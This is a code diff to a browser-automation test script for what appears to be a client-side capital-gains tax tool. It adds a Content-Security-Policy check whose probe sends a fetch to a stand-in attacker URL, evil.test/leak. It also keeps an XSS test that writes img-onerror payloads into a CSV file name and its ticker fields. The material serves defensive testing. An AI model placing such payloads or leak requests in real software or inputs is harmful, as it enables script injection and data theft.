@@ -51,11 +51,12 @@ async function scenario(files, opts) {
     res0.after = await page.evaluate(() => S.de.headline);
     if (opts.year2) await page.selectOption('#year', String(opts.year2));
   }
+  const cspProbe = opts.cspProbe ? await page.evaluate(async () => { try { await fetch('https://evil.test/leak'); return 'sent'; } catch (e) { return 'blocked'; } }) : null;
   const res = await page.evaluate(() => ({ headline: S.de.headline, total: S.de.total, unmatched: S.de.unmatched.map(u => u.sym), big: document.querySelector('#headline .big').textContent,
     warnings: document.getElementById('warnings').innerText, rateSource: S.rateSource, bgVisible: document.getElementById('bg').style.display !== 'none',
-    xss: window.__xss || null, h2: document.querySelector('#headline h2').textContent, files: S.files.map(f => f.name), sales: document.querySelectorAll('#sales tr').length - 1, estimate: S.de.estimate }));
+    xss: window.__xss || null, csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'), inlineScripts: [...document.scripts].filter(x => !x.src).length, h2: document.querySelector('#headline h2').textContent, files: S.files.map(f => f.name), sales: document.querySelectorAll('#sales tr').length - 1, estimate: S.de.estimate }));
   await browser.close();
-  return { ...res, res0, atLoad, requests: reqs, site, tries, errors };
+  return { ...res, res0, cspProbe, atLoad, requests: reqs, site, tries, errors };
 }
 
 (async () => {
@@ -73,6 +74,6 @@ async function scenario(files, opts) {
   const tmp = fs.mkdtempSync(path.join(require('os').tmpdir(), 'taxxss-'));
   const evil = path.join(tmp, '<img src=x onerror=window.__xss=1>.csv');
   fs.writeFileSync(evil, 'type,asset_type,ticker,date,quantity,price,currency\nbuy,stock,"<img src=x onerror=window.__xss=2>",2023-01-10,1,10,EUR\nsell,stock,"<img src=x onerror=window.__xss=2>",2023-02-10,1,12,EUR\n');
-  out.xss = await scenario([evil], { year: 2023, mode: 'none' });
+  out.xss = await scenario([evil], { year: 2023, mode: 'none', cspProbe: true });
   process.stdout.write(JSON.stringify(out));
 })().catch(e => { console.error(e); process.exit(1); });
